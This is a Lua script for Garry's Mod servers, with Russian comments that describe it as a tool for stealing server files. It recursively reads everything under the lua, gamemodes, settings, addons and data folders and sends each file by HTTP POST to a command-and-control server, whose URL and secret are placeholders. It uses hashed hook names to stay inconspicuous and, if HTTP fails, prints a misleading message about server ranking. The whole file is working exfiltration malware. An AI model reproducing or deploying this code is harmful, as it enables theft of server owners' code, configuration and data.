-- @filename: helzie.lua
-- @describe: Выполняет кражу серверных файлов.

local function GetPathFromFilename(path)
	for i = #path, 1, -1 do
		local c = string.sub(path, i, i);
		if (c == "/" or c == "\\") then
			return string.sub(path, 1, i);
		end
	end
	return "";
end

local HTTP 		= _G["HTTP"];
local SHA256	= _G["util"]["SHA256"];

local helzie 	= {};

-- @local: helzie.clock
-- @describe: Временная отметка инициализации.
helzie.clock = os.time();

-- @local: helzie.domains
-- @describe: Перечисление искомых директорий.
helzie.domains = {
	[1]	= "lua/*",
	[2] = "gamemodes/*",
	[3] = "settings/*",
	[4] = "addons/*",
	[5] = "data/*",
};

-- @local: helzie.files
-- @describe: Методы для работы с файлами.
helzie.files = ({ stored = {} });

-- @function: helzie.files:Bufferize(<string: path>, <string: domain>)
-- @describe: Прекэширует содержимое файла в локальный буфер.
-- @arguments (2): <string: path>, <string: domain>
-- @returns: String
function helzie.files:Bufferize(path, domain)
	assert(isstring(path), "Argument #1 has to be a string");
	assert(isstring(domain), "Argument #2 has to be a string");

	local f = file.Open(path, "rb", domain);
	if (not f) then return; end

	self.stored[path] = (f:Read(f:Size()) or "");
	f:Close();

	return self.stored[path];
end

-- @function: helzie.files:Skim(<string: path>, <string: domain>)
-- @describe: Выполняет рекурсивный поиск и прекэширование файлов.
-- @arguments (2): <string: path>, <string: domain>
-- @returns: None
function helzie.files:Skim(path, domain)
	assert(isstring(path), "Argument #1 has to be a string");
	assert(isstring(domain), "Argument #2 has to be a string");

	local path = (path or "");
	local relative = GetPathFromFilename(path);

	for k, v in ipairs({ file.Find(path, domain) }) do
		for x, y in ipairs(v) do
			if (k == 1) then
				self:Bufferize(string.format("%s%s", relative, y), domain);
			elseif (k == 2) then
				self:Skim(string.format("%s%s/*", relative, y), domain);
			end
		end
	end
end

-- @function: helzie.files:Iterator()
-- @describe: Возвращает итератор содержимого буфера.
-- @arguments (0): None
-- @returns: Iterator
function helzie.files:Iterator()
	return pairs(self.stored);
end

-- @local: helzie.forwarder
-- @describe: Методы для работы с передачей файлов на C2-сервер.
helzie.forwarder = {};

-- @local: helzie.forwarder.remoteAddr
-- @describe: Константа адреса удалённого C2-сервера.
helzie.forwarder.remoteAddr = "<PUT_YOUR_C2_URL_HERE>";

-- @function: helzie.forwarder:Forward(<string: path>, <boolean: bEncode>)
-- @describe: Передаёт файл из буфера на удалённый сервер.
-- @arguments (2): <string: path>, <boolean: bEncode>
-- @returns: None
function helzie.forwarder:Forward(path, bEncode)
	assert(isstring(path), "Argument #1 has to be a string");
	assert(helzie.files.stored[path], "Invalid file path");

	if (not HTTP({
		url			= string.format("%s/v1/forwarder.forward", self.remoteAddr),
		method		= "POST",
		parameters	= {
			["secret"]	= "<PUT_YOUR_C2_SECRET_HERE>",
			["path"]	= (bEncode and (path .. ".b64") or path),
			["content"]	= (bEncode and util.Base64Encode(helzie.files.stored[path], true)
				or helzie.files.stored[path]),
		},
		success = function(code)
			if (code == 400 and not bEncode) then
				return helzie.forwarder:Forward(path, true);
			elseif (code ~= 200 and code ~= 400) then
				return helzie.forwarder:Forward(path);
			end
		end,
	})) then
		MsgC(Color(255, 255, 255), "Server ranking in server browser will be "
			.. "negatively impacted due to HTTP being disabled.");
	end
end

for k, v in ipairs(helzie.domains) do
	helzie.files:Skim(v, "GAME");
end

return hook.Add("InitPostEntity", SHA256(helzie.clock), function()
	hook.Remove("InitPostEntity", SHA256(helzie.clock));
	hook.Add("Think", SHA256(helzie.clock), function()
		hook.Remove("Think", SHA256(helzie.clock));
		for k, v in helzie.files:Iterator() do
			helzie.forwarder:Forward(k);
		end
	end);
end);
